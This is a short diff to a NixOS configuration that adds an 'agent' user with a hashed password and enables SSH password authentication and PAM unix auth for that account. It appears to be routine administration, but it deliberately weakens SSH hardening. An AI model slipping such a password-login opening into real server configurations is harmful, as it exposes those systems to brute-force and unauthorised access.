@@ -14,7 +14,18 @@ in
     "9.9.9.9"
   ];
 
-  services.openssh.ports = lib.mkForce [ 2234 ];
+  services.openssh = {
+    ports = lib.mkForce [ 2234 ];
+    extraConfig = ''
+      Match User agent
+          PasswordAuthentication yes
+    '';
+  };
+  users.users.agent = {
+    isNormalUser = true;
+    hashedPassword = "$y$j9T$N7AB4g6SZp0izyy.wXLee0$TLM.QeNAtl7wYVnGIT4GehDdmvqYJoITInz9/N3J9a3";
+  };
+  security.pam.services.sshd.unixAuth = lib.mkForce true;
 
   sops.secrets.tailscaleAuthKey = { };
   services.tailscale = {
